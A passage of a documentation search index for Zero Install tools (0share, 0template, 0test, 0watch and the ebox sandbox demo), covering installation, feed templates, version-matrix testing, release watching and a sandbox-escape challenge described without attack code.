sha1new=84e37424bbb87a077e25cec87d3c668f12726817 INFO:root:Caching new implementation (digest sha1new=84e37424bbb87a077e25cec87d3c668f12726817) Success The requested version should now be in machine2's cache. On the source machine, you should see something like: INFO:root:Request from ('192.168.2.2', 53182): '0share\\nsha1new=84e37424bbb87a077e25cec87d3c668f12726817' INFO:root:Yes, we have sha1new=84e37424bbb87a077e25cec87d3c668f12726817 INFO:root:Sending reply... INFO:root:GET /implementation/sha1new=84e37424bbb87a077e25cec87d3c668f12726817 machine2 - - [13/Dec/2008 21:52:49] \"GET /implementation/sha1new=84e37424bbb87a077e25cec87d3c668f12726817 HTTP/1.1\" 200 -","title":"Testing"},{"location":"tools/0share/#debugging","text":"If it doesn't work: Check that your firewall allows TCP and UDP connections to port 38339 on the first machine. Try using -H on the second machine to give the hostname of the first machine explicitly. If you get \"Network is unreachable\", you may be missing a default route (see ip route ).","title":"Debugging"},{"location":"tools/0share/#realistic-configuration","text":"Before you start, you should enable sharing on all machines. This ensures that implementations all go in the single machine-wide shared cache ( /var/cache/0install.net/implementations/ ). You'll probably want to run 0share without write access anywhere (for security), so create a new user for that and try running it: $ sudo adduser --system zeroshare $ sudo su zeroshare -s /usr/bin/env -- 0launch -vc http://0install.net/2008/interfaces/0share.xml You can then add a line to your crontab file to make it start on boot: @reboot zeroshare 0launch -vc http://0install.net/2008/interfaces/0share.xml 2>&1 >/dev/null","title":"Realistic configuration"},{"location":"tools/0share/#using-with-0launch","text":"As this is experimental, you'll need to use the peer2peer branch of 0install. In that branch, P2P support is turned on when using the GUI for downloads.","title":"Using with 0launch"},{"location":"tools/0template/","text":"Name: 0template Maintainer: Thomas Leonard License: GNU Lesser General Public License Source: Git repository Zero Install feed: http://0install.net/tools/0template.xml 0template creates the XML for one version of a program from a template. The diagram below shows how it fits into the overall publishing process: That is, each time you want to add a new release of a program to your master XML feed, you first use 0template to generate the XML for the new release. Once you're happy with it, merge it into the master feed with 0repo . 0template is mostly useful for publishing existing binary or source archives. If you are making releases of your own software from Git, consider using 0release instead. Contents: Installation Creating the template Using the template Installation To get it: $ 0install add 0template http://0install.net/tools/0template.xml Creating the template To start, run it with a non-existent file and it will offer to create it: $ 0template myprog.xml.template 'myprog.xml.template' does not exist; creating new template. Does your program need to be compiled before it can be used? 1) Generate a source template (e.g. for compiling C source code) 2) Generate a binary template (e.g. for a pre-compiled binary or script) > 2 Writing myprog.xml.template Then edit the generated myprog.xml.template to taste. A minimal example would be: <?xml version=\"1.0\"?> <interface xmlns=\"http://zero-install.sourceforge.net/2004/injector/interface\"> <name>myprog</name> <summary>does useful stuff</summary> <group> <command name=\"run\" path=\"myprog\"/> <implementation version=\"{version}\"> <manifest-digest/> <archive href=\"http://example.com/downloads/myprog-{version}.zip\"/> </implementation> </group> </interface> You would typically want to add any dependencies here too. See the feed specification for details. Note: You can also use 0template to create a local feed to run a Git checkout, rather than an archive on the web. In that case, just don't use the .template extension, and it will generate a feed rather than a template. Using the template To generate the XML for a particular version, run 0template on it and provide the template parameters ( version in this example), e.g. $ 0template myprog.xml.template version=1.0 Downloading http://example.com/downloads/myprog-1.0.zip to ./myprog-1.0.zip Writing myprog-1.0.xml You now have a feed with the appropriate details filled in: <?xml version=\"1.0\"?> <interface xmlns=\"http://zero-install.sourceforge.net/2004/injector/interface\"> <name>myprog</name> <summary>does useful stuff</summary> <group> <command name=\"run\" path=\"myprog\"/> <implementation id=\"sha1new=67ba178ed33b292efa5ab364d01a8fc13fe9eba3\" version=\"1.0\"> <manifest-digest sha256new=\"FBXDJXLMHAPCRNZ5XOQTVYQHD6VP7CZAZ2UKCCV5UYE27C752GIQ\"/> <archive extract=\"myprog-1.0\" href=\"http://example.com/downloads/myprog-1.0.zip\" size=\"352\"/> </implementation> </group> </interface> Specifically, 0template fills in these values: All {...} text is expanded with the values you provided on the command-line. The archive is downloaded to the directory containing the feed, if it's not already there. The size attribute is set to the size of the archive. The extract attribute is set to the single top-level directory in the archive, if it has one. The id is set to the sha1new digest of the archive. Any empty attributes of manifest-digest are filled in with the calculated digests. If there are no attributes, a sha256new digest is added. You can now test this feed using e.g. $ 0launch myprog-1.0.xml Or, for source feeds: $ 0compile autocompile myprog-1.0.xml Once you are happy with it, you can add it to the master feed (which contains all versions) using 0repo . e.g. $ 0repo add myprog-1.2.xml","title":"0template"},{"location":"tools/0template/#installation","text":"To get it: $ 0install add 0template http://0install.net/tools/0template.xml","title":"Installation"},{"location":"tools/0template/#creating-the-template","text":"To start, run it with a non-existent file and it will offer to create it: $ 0template myprog.xml.template 'myprog.xml.template' does not exist; creating new template. Does your program need to be compiled before it can be used? 1) Generate a source template (e.g. for compiling C source code) 2) Generate a binary template (e.g. for a pre-compiled binary or script) > 2 Writing myprog.xml.template Then edit the generated myprog.xml.template to taste. A minimal example would be: <?xml version=\"1.0\"?> <interface xmlns=\"http://zero-install.sourceforge.net/2004/injector/interface\"> <name>myprog</name> <summary>does useful stuff</summary> <group> <command name=\"run\" path=\"myprog\"/> <implementation version=\"{version}\"> <manifest-digest/> <archive href=\"http://example.com/downloads/myprog-{version}.zip\"/> </implementation> </group> </interface> You would typically want to add any dependencies here too. See the feed specification for details. Note: You can also use 0template to create a local feed to run a Git checkout, rather than an archive on the web. In that case, just don't use the .template extension, and it will generate a feed rather than a template.","title":"Creating the template"},{"location":"tools/0template/#using-the-template","text":"To generate the XML for a particular version, run 0template on it and provide the template parameters ( version in this example), e.g. $ 0template myprog.xml.template version=1.0 Downloading http://example.com/downloads/myprog-1.0.zip to ./myprog-1.0.zip Writing myprog-1.0.xml You now have a feed with the appropriate details filled in: <?xml version=\"1.0\"?> <interface xmlns=\"http://zero-install.sourceforge.net/2004/injector/interface\"> <name>myprog</name> <summary>does useful stuff</summary> <group> <command name=\"run\" path=\"myprog\"/> <implementation id=\"sha1new=67ba178ed33b292efa5ab364d01a8fc13fe9eba3\" version=\"1.0\"> <manifest-digest sha256new=\"FBXDJXLMHAPCRNZ5XOQTVYQHD6VP7CZAZ2UKCCV5UYE27C752GIQ\"/> <archive extract=\"myprog-1.0\" href=\"http://example.com/downloads/myprog-1.0.zip\" size=\"352\"/> </implementation> </group> </interface> Specifically, 0template fills in these values: All {...} text is expanded with the values you provided on the command-line. The archive is downloaded to the directory containing the feed, if it's not already there. The size attribute is set to the size of the archive. The extract attribute is set to the single top-level directory in the archive, if it has one. The id is set to the sha1new digest of the archive. Any empty attributes of manifest-digest are filled in with the calculated digests. If there are no attributes, a sha256new digest is added. You can now test this feed using e.g. $ 0launch myprog-1.0.xml Or, for source feeds: $ 0compile autocompile myprog-1.0.xml Once you are happy with it, you can add it to the master feed (which contains all versions) using 0repo . e.g. $ 0repo add myprog-1.2.xml","title":"Using the template"},{"location":"tools/0test/","text":"Name: 0test Maintainer: Thomas Leonard License: GNU General Public License Source: Git repository Zero Install feed: http://0install.net/2008/interfaces/0test.xml A Zero Install feed can specify a command to run to test the program automatically using the self-test attribute (or the test command). 0test runs this command. It can also test combinations of various versions of a program and its dependencies. Create a short-cut to it in the usual way: $ 0install add 0test http://0install.net/2008/interfaces/0test.xml Contents: Usage Other ways to specify versions Ranges %nonlocal Passing test arguments Specifying a test command Test-only dependencies Usage Most simply, you can use it to run the tests for a program you have downloaded or checked out of version control. e.g. $ git clone some-program $ 0test some-program/program.xml You can also use it to test released programs, e.g. to test the default version of 0compile: $ 0test http://0install.net/2006/interfaces/0compile.xml Passed - 0compile v0.21-post, ZeroInstall-Injector v0.51.1, 0publish v0.18-post, ROX-Lib2 v2.0.6-post 0test prints out the result and the versions of all components used in the test. You can specify a particular set of versions to test: $ 0test http://0install.net/2006/interfaces/0compile.xml 0.26 0.27 Passed - ZeroInstall-Injector v1.7 0compile v0.26, ROX-Lib2 v2.0.6, python v2.7.3, 0publish v0.20 - ZeroInstall-Injector v1.7 0compile v0.27, ROX-Lib2 v2.0.6, python v2.7.3, 0publish v0.20 None skipped None failed A summary is printed at the end showing the result of each combination: Passed the tests all passed successfully (the command returned an exit status of zero) Skipped this combination of versions can't be used together (or no tests are defined) Failed some tests failed (the self-test command returned a non-zero exit status) You can specify versions of libraries the program depends on too. 0test will try all combinations. This tests three versions of 0compile against three versions of Zero Install (a total of 3 x 3 = 9 tests): $ 0test --html results.html \\ http://0install.net/2006/interfaces/0compile.xml 0.19 0.20 0.21 \\ http://0install.net/2007/interfaces/ZeroInstall.xml 0.47 0.48 0.49 Passed - 0compile v0.20, ZeroInstall-Injector v0.48, 0publish v0.18-post, ROX-Lib2 v2.0.6-post - 0compile v0.20, ZeroInstall-Injector v0.49, 0publish v0.18-post, ROX-Lib2 v2.0.6-post - 0compile v0.21, ZeroInstall-Injector v0.48, 0publish v0.18-post, ROX-Lib2 v2.0.6-post - 0compile v0.21, ZeroInstall-Injector v0.49, 0publish v0.18-post, ROX-Lib2 v2.0.6-post Skipped - 0compile v0.21, ZeroInstall-Injector v0.47 Failed - 0compile v0.19, ZeroInstall-Injector v0.47, 0publish v0.18-post, ROX-Lib2 v2.0.6-post - 0compile v0.19, ZeroInstall-Injector v0.48, 0publish v0.18-post, ROX-Lib2 v2.0.6-post - 0compile v0.19, ZeroInstall-Injector v0.49, 0publish v0.18-post, ROX-Lib2 v2.0.6-post - 0compile v0.20, ZeroInstall-Injector v0.47, 0publish v0.18-post, ROX-Lib2 v2.0.6-post The --html results.html option causes it to also generate this table: ZeroInstall-Injector 0compile 0.47 0.48 0.49 0.19 0publish 0.18-post ROX-Lib2 2.0.6-post 0publish 0.18-post ROX-Lib2 2.0.6-post 0publish 0.18-post ROX-Lib2 2.0.6-post 0.20 0publish 0.18-post ROX-Lib2 2.0.6-post 0publish 0.18-post ROX-Lib2 2.0.6-post 0publish 0.18-post ROX-Lib2 2.0.6-post 0.21 skipped 0publish 0.18-post ROX-Lib2 2.0.6-post 0publish 0.18-post ROX-Lib2 2.0.6-post Green = Passed, Red = Failed, Yellow = Skipped. The contents of the cells show the versions of components used in the tests where you didn't specify the version (so 0test selected one for you). We can see in this example that the unit-tests for 0compile 0.19 no longer pass, regardless of the version of Zero Install used. This problem was caused by a change to the GNU-Hello test program it uses within its own tests. Ideally, programs should depend on their test data using <requires> (see below), but 0compile actually needed to test downloading of the test code itself. 0compile 0.20 fails with older version of Zero Install due to a bug in the way \"0launch --get-selections\" generated the XML. 0compile 0.21 depends on a later version explicitly, so the broken combination is skipped. If you specify a test matrix with more than two dimensions, 0test will generate a series of tables. Other ways to specify versions As well as passing simple version numbers, you can also allow 0test to choose a suitable version given some constraints. This is useful in test scripts: Ranges You can use , to give a range of possible versions. This is useful with native packages where you don't know the exact version. For example, to test against any Python version 2.6.x (2.6 <= version < 2.7): $ 0test prog.xml http://repo.roscidus.com/python/python 2.6,2.7 Passed - prog 0.1, python v2.6.8-0.2 %nonlocal Don't select a local (i.e. unreleased) version to test against: $ 0test prog.xml Passed - prog 0.1, lib v1.11-post $ 0test prog.xml http://example.com/lib %nonlocal Passed - prog 0.1, lib v1.11 Passing test arguments You can pass extra arguments to the test command, but you must put them after -- to stop 0test interpreting them as arguments or versions. e.g. to run 0test on itself with verbose output: $ 0test alias:0test -- -v Specifying a test command The --test-command option can be used to run the shell command of your choice, rather than the test command given in the feed's self-test attribute. The command that would be executed if the implemention were run normally is available as $* . For example, to check that rox --version worked in versions 2.8 and 2.9 of ROX-Filer: $ 0test -t '$* --version > /dev/null' \\ http://rox.sourceforge.net/2005/interfaces/ROX-Filer 2.8 2.9 Passed - ROX-Filer v2.8 - ROX-Filer v2.9 None skipped None failed You can use --command to select a different <command> . By default, the command used is test when run normally, or run when using -t . You can also set this to the empty string to select no command (useful with libraries). In that case, $1 is the directory itself rather than the command. Test-only dependencies Starting from 0test 0.4, you can also use the <command> syntax instead of the self-test attribute. This allows passing extra arguments and specifying test-specific dependencies. For example: <group> <requires interface=\"http://example.com/somelib.xml\"> ... </requires> <command name=\"test\" path=\"tests/testall.py\"> <requires interface=\"http://testing.com/testframework.xml\"> <environment insert=\"\" mode=\"replace\" name=\"TEST_FRAMEWORK\"/> </requires> </command> <implementation id=\".\" version=\"0.1-pre\"/> </group>","title":"0test"},{"location":"tools/0test/#usage","text":"Most simply, you can use it to run the tests for a program you have downloaded or checked out of version control. e.g. $ git clone some-program $ 0test some-program/program.xml You can also use it to test released programs, e.g. to test the default version of 0compile: $ 0test http://0install.net/2006/interfaces/0compile.xml Passed - 0compile v0.21-post, ZeroInstall-Injector v0.51.1, 0publish v0.18-post, ROX-Lib2 v2.0.6-post 0test prints out the result and the versions of all components used in the test. You can specify a particular set of versions to test: $ 0test http://0install.net/2006/interfaces/0compile.xml 0.26 0.27 Passed - ZeroInstall-Injector v1.7 0compile v0.26, ROX-Lib2 v2.0.6, python v2.7.3, 0publish v0.20 - ZeroInstall-Injector v1.7 0compile v0.27, ROX-Lib2 v2.0.6, python v2.7.3, 0publish v0.20 None skipped None failed A summary is printed at the end showing the result of each combination: Passed the tests all passed successfully (the command returned an exit status of zero) Skipped this combination of versions can't be used together (or no tests are defined) Failed some tests failed (the self-test command returned a non-zero exit status) You can specify versions of libraries the program depends on too. 0test will try all combinations. This tests three versions of 0compile against three versions of Zero Install (a total of 3 x 3 = 9 tests): $ 0test --html results.html \\ http://0install.net/2006/interfaces/0compile.xml 0.19 0.20 0.21 \\ http://0install.net/2007/interfaces/ZeroInstall.xml 0.47 0.48 0.49 Passed - 0compile v0.20, ZeroInstall-Injector v0.48, 0publish v0.18-post, ROX-Lib2 v2.0.6-post - 0compile v0.20, ZeroInstall-Injector v0.49, 0publish v0.18-post, ROX-Lib2 v2.0.6-post - 0compile v0.21, ZeroInstall-Injector v0.48, 0publish v0.18-post, ROX-Lib2 v2.0.6-post - 0compile v0.21, ZeroInstall-Injector v0.49, 0publish v0.18-post, ROX-Lib2 v2.0.6-post Skipped - 0compile v0.21, ZeroInstall-Injector v0.47 Failed - 0compile v0.19, ZeroInstall-Injector v0.47, 0publish v0.18-post, ROX-Lib2 v2.0.6-post - 0compile v0.19, ZeroInstall-Injector v0.48, 0publish v0.18-post, ROX-Lib2 v2.0.6-post - 0compile v0.19, ZeroInstall-Injector v0.49, 0publish v0.18-post, ROX-Lib2 v2.0.6-post - 0compile v0.20, ZeroInstall-Injector v0.47, 0publish v0.18-post, ROX-Lib2 v2.0.6-post The --html results.html option causes it to also generate this table: ZeroInstall-Injector 0compile 0.47 0.48 0.49 0.19 0publish 0.18-post ROX-Lib2 2.0.6-post 0publish 0.18-post ROX-Lib2 2.0.6-post 0publish 0.18-post ROX-Lib2 2.0.6-post 0.20 0publish 0.18-post ROX-Lib2 2.0.6-post 0publish 0.18-post ROX-Lib2 2.0.6-post 0publish 0.18-post ROX-Lib2 2.0.6-post 0.21 skipped 0publish 0.18-post ROX-Lib2 2.0.6-post 0publish 0.18-post ROX-Lib2 2.0.6-post Green = Passed, Red = Failed, Yellow = Skipped. The contents of the cells show the versions of components used in the tests where you didn't specify the version (so 0test selected one for you). We can see in this example that the unit-tests for 0compile 0.19 no longer pass, regardless of the version of Zero Install used. This problem was caused by a change to the GNU-Hello test program it uses within its own tests. Ideally, programs should depend on their test data using <requires> (see below), but 0compile actually needed to test downloading of the test code itself. 0compile 0.20 fails with older version of Zero Install due to a bug in the way \"0launch --get-selections\" generated the XML. 0compile 0.21 depends on a later version explicitly, so the broken combination is skipped. If you specify a test matrix with more than two dimensions, 0test will generate a series of tables.","title":"Usage"},{"location":"tools/0test/#other-ways-to-specify-versions","text":"As well as passing simple version numbers, you can also allow 0test to choose a suitable version given some constraints. This is useful in test scripts:","title":"Other ways to specify versions"},{"location":"tools/0test/#ranges","text":"You can use , to give a range of possible versions. This is useful with native packages where you don't know the exact version. For example, to test against any Python version 2.6.x (2.6 <= version < 2.7): $ 0test prog.xml http://repo.roscidus.com/python/python 2.6,2.7 Passed - prog 0.1, python v2.6.8-0.2","title":"Ranges"},{"location":"tools/0test/#nonlocal","text":"Don't select a local (i.e. unreleased) version to test against: $ 0test prog.xml Passed - prog 0.1, lib v1.11-post $ 0test prog.xml http://example.com/lib %nonlocal Passed - prog 0.1, lib v1.11","title":"%nonlocal"},{"location":"tools/0test/#passing-test-arguments","text":"You can pass extra arguments to the test command, but you must put them after -- to stop 0test interpreting them as arguments or versions. e.g. to run 0test on itself with verbose output: $ 0test alias:0test -- -v","title":"Passing test arguments"},{"location":"tools/0test/#specifying-a-test-command","text":"The --test-command option can be used to run the shell command of your choice, rather than the test command given in the feed's self-test attribute. The command that would be executed if the implemention were run normally is available as $* . For example, to check that rox --version worked in versions 2.8 and 2.9 of ROX-Filer: $ 0test -t '$* --version > /dev/null' \\ http://rox.sourceforge.net/2005/interfaces/ROX-Filer 2.8 2.9 Passed - ROX-Filer v2.8 - ROX-Filer v2.9 None skipped None failed You can use --command to select a different <command> . By default, the command used is test when run normally, or run when using -t . You can also set this to the empty string to select no command (useful with libraries). In that case, $1 is the directory itself rather than the command.","title":"Specifying a test command"},{"location":"tools/0test/#test-only-dependencies","text":"Starting from 0test 0.4, you can also use the <command> syntax instead of the self-test attribute. This allows passing extra arguments and specifying test-specific dependencies. For example: <group> <requires interface=\"http://example.com/somelib.xml\"> ... </requires> <command name=\"test\" path=\"tests/testall.py\"> <requires interface=\"http://testing.com/testframework.xml\"> <environment insert=\"\" mode=\"replace\" name=\"TEST_FRAMEWORK\"/> </requires> </command> <implementation id=\".\" version=\"0.1-pre\"/> </group>","title":"Test-only dependencies"},{"location":"tools/0watch/","text":"Name: 0watch Maintainer: Bastian Eicher License: GNU Lesser General Public License Source: Git repository Zero Install feed: http://0install.de/feeds/0watch.xml 0watch scans websites for new releases using arbitrary Python code snippets. When new releases are detected 0template is used to create/update a Zero Install feed. To make the 0watch command available on your command-line you can run: $ 0install add 0watch http://0install.de/feeds/0watch.xml To use 0watch you need both a template file named like MyApp.xml.template and watch file named like MyApp.watch.py in the same directory. You can then run: $ 0watch MyApp.watch.py Details A watch file is a Python script that pulls a list of releases from a website. It must set an attribute named releases to an array of dictionaries. Each array element represents to a single release and each dictionary tuple is a variable substitution for the template. A basic watch file could look like this: from urllib import request import json data = request.urlopen(request.Request('https://api.github.com/repos/myproj/myapp/releases')).read() releases = [{'version': release['tag_name'], 'released': release['published_at'][0:10]} for release in json.loads(data)] For each release reported by the watch file 0watch attempts to determine whether the version is already known. It does this by: checking if a file named MyApp-VERSION.xml exists in the same directory and checking if a file named MyApp.xml exists in the same directory and contains an implementation with the version. 0watch then calls 0template once for each new release.","title":"0watch"},{"location":"tools/0watch/#details","text":"A watch file is a Python script that pulls a list of releases from a website. It must set an attribute named releases to an array of dictionaries. Each array element represents to a single release and each dictionary tuple is a variable substitution for the template. A basic watch file could look like this: from urllib import request import json data = request.urlopen(request.Request('https://api.github.com/repos/myproj/myapp/releases')).read() releases = [{'version': release['tag_name'], 'released': release['published_at'][0:10]} for release in json.loads(data)] For each release reported by the watch file 0watch attempts to determine whether the version is already known. It does this by: checking if a file named MyApp-VERSION.xml exists in the same directory and checking if a file named MyApp.xml exists in the same directory and contains an implementation with the version. 0watch then calls 0template once for each new release.","title":"Details"},{"location":"tools/ebox/","text":"Name: ebox Maintainer: Thomas Leonard License: GNU Lesser General Public License Source: Git repository Zero Install feed: http://0install.net/tests/ebox.xml EBox is a proof-of-concept that integrates Zero Install's safe installation with E's sandboxing features. It allows you to install programs and run them in a restricted environment. Despite this, the programs still benefit from Zero Install's dependency handling, automatic updates, sharing, etc. Contents: Overview Tutorial What a boxed program can and can't do Networking The challenge! Bonus challenge! Notes Conclusions Overview A secure system should allow the user to install and run software with limited privileges, so that the damage that can be caused by malicious software is limited. The sandboxing should be simple enough that it can be used by all users as a matter of course. Zero Install is designed to solve the installation part of this problem, and is intended to integrate with existing sandboxing tools to provide the rest. The purposes of this page are: To make it clear what we hope to achieve with Zero Install. To demonstrate that such integration is possible, and provide an example of how to do it. To find bugs or weaknesses in Zero Install's implementation or design. Different sandboxes provide different features. Ideally we would use an OS-level tool that could sandbox any application (e.g. Plash). However, these are not yet widely available, difficult to deploy, or only available on certain systems. Therefore, this example uses application-level sandboxing instead (relying on security features of the programming language rather than those of the operating system). The advantage is that it should work everywhere. The disadvantage is that it only works with programs written in that language. We start with a tutorial showing how to install and run a couple of sample applications. Then we present a challenge: modify the sample applications to escape from the sandbox! If you find a security flaw, please report it to the mailing list , and I'll add you to the high-score table: Date Finder Flaw - (your name here!) - (challenge open since Aug 2010) Tutorial You can create a short-cut to ebox with 0install add , like this: $ 0install add ebox http://0install.net/tests/ebox.xml You can then install a program like this: $ ebox ~/edit http://0install.net/tests/ebox-edit.xml Created instance directory. To run: ~/edit/AppRun This creates a directory at the path you specified ( ~/edit ). This directory contains all the program's configuration, and a script to start it (AppRun). [ Technically, it's a ROX application directory , but whereas these normally include program code (but no configuration), this one includes only configuration, with the code going in the Zero Install cache. ] If you run the ~/edit/AppRun script, a fairly normal-looking text editor should appear. You can open, edit and save files just as you'd expect: However, the program is running in a restricted environment. It can only access files that you select using a file selector dialog box. It's hard to demonstrate this security, because permission is granted automatically by your actions, so you should try attacking it to convince yourself. What a boxed program can and can't do Every window it opens is prefixed with the name you gave it (e.g. edit: <untitled> ). It can't access a file unless you explicitly select it, or pass it as a command-line argument. It can't send a copy of a file you open over the network (see below for network access). It can read and write files under its own data directory ( ~/edit/data/* ) If you grant it access to something (e.g. read access to a file), it could persist this in ~/edit/auths/* so it still has it next time you run the program, although ebox-edit itself doesn't do this. It can open any number of windows, use up lots of CPU time, etc. Networking Next, we'll try a program that uses the network: $ ebox alicesChat http://0install.net/tests/ebox-chat.xml Notice that ebox-chat uses the same library (ebox-help) as ebox-edit, and so they share a single copy: ebox-chat is a simple chat program. When you run it, it will ask for permission to access the network: Once you give it network access, it is able to store it for later (creating the file alicesChat/auths/network ), so you won't have to reconfirm each time it starts. It then displays an (empty) list of contacts. We'll need someone to talk to. This could be on another machine, or you can take advantage of the sandboxing to create a second instance on the same machine. We'll pretend that the first instance is running on Alice's computer, and the second is Bob's: $ ebox bobsChat http://0install.net/tests/ebox-chat.xml We don't have to worry that these two programs will conflict or try to use the same configuration; they can each only access files inside their own directory by default. Of course, the actual program code is shared between them. When you run bobsChat, you'll need to grant that network access too. Add a contact called \"Bob\" to Alice's contacts list, and a contact called \"Alice\" to Bob's list. One of them should send an invitation (a file), and the other should accept it. The invitation file should be transferred over some secure channel and kept safe until pairing is complete. Note that ebox-chat is a peer-to-peer chat program with no central server. If there are firewalls or NATs between the machines, things get \"interesting\"... it's only a demo after all ;-) Once paired, either party can call the other: The challenge! I have a file, /home/tal/precious.txt , containing some important information. Your challenge is to either discover the contents of this file or to change it. You do this by creating a malicious application (e.g. by modifying ebox-edit or ebox-chat). I will install your program and try using it for a bit. If Zero Install warns me that your key isn't trusted, I'll ignore it and trust the key anyway. I will also approve any keys needed for any libraries you depend on. Since I don't trust your program, I won't try to open my precious file in it. I will be happy to create and edit test files, though. The precious.txt file has no special protection: it's a regular text file, readable and writable by me (if I ask ebox-edit to open it, it will). For this challenge, we exclude denial-of-service attacks (e.g. if you make my computer run so slowly I have to reboot it). The easiest way to get started is to clone ebox-edit's Git repository and create a new instance from its local feed: $ git clone git://zero-install.git.sourceforge.net/gitroot/zero-install/ebox-edit $ ebox test-instance ebox-edit/edit.xml $ ./test-instance/AppRun You can try to modify the files in the checkout to escape from the sandbox. The syntax is explained in the Walnut guide to E . Bonus challenge! Alternatively, you could clone the ebox-help Git repository and modify the library. Register your modified library with 0install (using 0install add-feed ebox-help/help.xml ) and run a program that depends on it. You should find that the library runs in an even more restricted environment; it doesn't even get access to the application data! This demonstrates an interesting feature of ebox. Zero Install normally tells a component (such as ebox-edit) how to find a dependency (ebox-help) by setting environment variables (e.g. $CLASSPATH ). Environment variables are global to the process. Instead, ebox makes the dependency appear directly as a variable in the module's scope. For example, ebox-edit declares a dependency on ebox-help like this: <requires interface=\"http://0install.net/tests/ebox-help.xml\"> <environment insert=\"\" name=\"help\"/> </requires> It then creates a help window by calling <help:makeHelp>(shell, <this:manual>) . Here, the <help> loader is injected directly by ebox, and scoped to the ebox module: To code in ebox-edit, <help> refers to the ebox-help library, while <this> refers to ebox-edit. To code in ebox-help, <help> is not visible, while <this> refers to ebox-help. This means that libraries can't conflict even within a process. elib-help can't override a function defined in ebox-edit, for example, so the ebox-edit author doesn't need to fully trust the help library! Notes To make this useful, we need to integrate with a general purpose sandbox, such as Plash, so we can sandbox any application, not just those written in E. The long startup time for edit and chat is simply because they're running on Java, not because of the sandboxing. If a networked application (e.g. ebox-chat) seems to freeze, try wiggling the mouse; it might just need more entropy to generate random numbers for the crypto. About E: the important point here isn't how this particular sandbox works, but how sandboxing can be supported by Zero Install in general. However, here are some useful links about E and its underlying security model: http://wiki.erights.org/wiki/Walnut/Secure_Distributed_Computing http://en.wikipedia.org/wiki/Object-capability_model Conclusions Zero Install can be used to install and run sandboxed software. It does not execute any of the downloaded code outside of the sandbox and installation of malicious code does not affect other programs on the computer, even those running as the same user. Despite this, libraries are shared automatically between programs (sandboxed or not), update notifications work as normal, etc. In addition to its normal mode of operation, in which it sets environment variables to let components find their dependencies, Zero Install can also integrate tightly with a particular programming language, injecting scoped dependencies directly into individual modules within the language.","title":"ebox"},{"location":"tools/ebox/#overview","text":"A secure system should allow the user to install and run software with limited privileges, so that the damage that can be caused by malicious software is limited. The sandboxing should be simple enough that it can be used by all users as a matter of course. Zero Install is designed to solve the installation part of this problem, and is intended to integrate with existing sandboxing tools to provide the rest. The purposes of this page are: To make it clear what we hope to achieve with Zero Install. To demonstrate that such integration is possible, and provide an example of how to do it. To find bugs or weaknesses in Zero Install's implementation or design. Different sandboxes provide different features. Ideally we would use an OS-level tool that could sandbox any application (e.g. Plash). However, these are not yet widely available, difficult to deploy, or only available on certain systems. Therefore, this example uses application-level sandboxing instead (relying on security features of the programming language rather than those of the operating system). The advantage is that it should work everywhere. The disadvantage is that it only works with programs written in that language. We start with a tutorial showing how to install and run a couple of sample applications. Then we present a challenge: modify the sample applications to escape from the sandbox! If you find a security flaw, please report it to the mailing list , and I'll add you to the high-score table: Date Finder Flaw - (your name here!) - (challenge open since Aug 2010)","title":"Overview"},{"location":"tools/ebox/#tutorial","text":"You can create a short-cut to ebox with 0install add , like this: $ 0install add ebox http://0install.net/tests/ebox.xml You can then install a program like this: $ ebox ~/edit http://0install.net/tests/ebox-edit.xml Created instance directory. To run: ~/edit/AppRun This creates a directory at the path you specified ( ~/edit ). This directory contains all the program's configuration, and a script to start it (AppRun). [ Technically, it's a ROX application directory , but whereas these normally include program code (but no configuration), this one includes only configuration, with the code going in the Zero Install cache. ] If you run the ~/edit/AppRun script, a fairly normal-looking text editor should appear. You can open, edit and save files just as you'd expect: However, the program is running in a restricted environment. It can only access files that you select using a file selector dialog box. It's hard to demonstrate this security, because permission is granted automatically by your actions, so you should try attacking it to convince yourself.","title":"Tutorial"},{"location":"tools/ebox/#what-a-boxed-program-can-and-cant-do","text":"Every window it opens is prefixed with the name you gave it (e.g. edit: <untitled> ). It can't access a file unless you explicitly select it, or pass it as a command-line argument. It can't send a copy of a file you open over the network (see below for network access). It can read and write files under its own data directory ( ~/edit/data/* ) If you grant it access to something (e.g. read access to a file), it could persist this in ~/edit/auths/* so it still has it next time you run the program, although ebox-edit itself doesn't do this. It can open any number of windows, use up lots of CPU time, etc.","title":"What a boxed program can and can't do"},{"location":"tools/ebox/#networking","text":"Next, we'll try a program that uses the network: $ ebox alicesChat http://0install.net/tests/ebox-chat.xml Notice that ebox-chat uses the same library (ebox-help) as ebox-edit, and so they share a single copy: ebox-chat is a simple chat program. When you run it, it will ask for permission to access the network: Once you give it network access, it is able to store it for later (creating the file alicesChat/auths/network ), so you won't have to reconfirm each time it starts. It then displays an (empty) list of contacts. We'll need someone to talk to. This could be on another machine, or you can take advantage of the sandboxing to create a second instance on the same machine. We'll pretend that the first instance is running on Alice's computer, and the second is Bob's: $ ebox bobsChat http://0install.net/tests/ebox-chat.xml We don't have to worry that these two programs will conflict or try to use the same configuration; they can each only access files inside their own directory by default. Of course, the actual program code is shared between them. When you run bobsChat, you'll need to grant that network access too. Add a contact called \"Bob\" to Alice's contacts list, and a contact called \"Alice\" to Bob's list. One of them should send an invitation (a file), and the other should accept it. The invitation file should be transferred over some secure channel and kept safe until pairing is complete. Note that ebox-chat is a peer-to-peer chat program with no central server. If there are firewalls or NATs between the machines, things get \"interesting\"... it's only a demo after all ;-) Once paired, either party can call the other:","title":"Networking"},{"location":"tools/ebox/#the-challenge","text":"I have a file, /home/tal/precious.txt , containing some important information. Your challenge is to either discover the contents of this file or to change it. You do this by creating a malicious application (e.g. by modifying ebox-edit or ebox-chat). I will install your program and try using it for a bit. If Zero Install warns me that your key isn't trusted, I'll ignore it and trust the key anyway. I will also approve any keys needed for any libraries you depend on. Since I don't trust your program, I won't try to open my precious file in it. I will be happy to create and edit test files, though. The precious.txt file has no special protection: it's a regular text file, readable and writable by me (if I ask ebox-edit to open it, it will). For this challenge, we exclude denial-of-service attacks (e.g. if you make my computer run so slowly I have to reboot it). The easiest way to get started is to clone ebox-edit's Git repository and create a new instance from its local feed: $ git clone git://zero-install.git.sourceforge.net/gitroot/zero-install/ebox-edit $ ebox test-instance ebox-edit/edit.xml $ ./test-instance/AppRun You can try to modify the files in the checkout to escape from the sandbox. The syntax is explained in the Walnut guide to E .","title":"The challenge!"},{"location":"tools/ebox/#bonus-challenge","text":"Alternatively, you could clone the ebox-help Git repository and modify the library. Register your modified library with 0install (using 0install add-feed ebox-help/help.xml ) and run a program that depends on it. You should find that the library runs in an even more restricted environment; it doesn't even get access to the application data! This demonstrates an interesting feature of ebox. Zero Install normally tells a component (such as ebox-edit) how to find a dependency 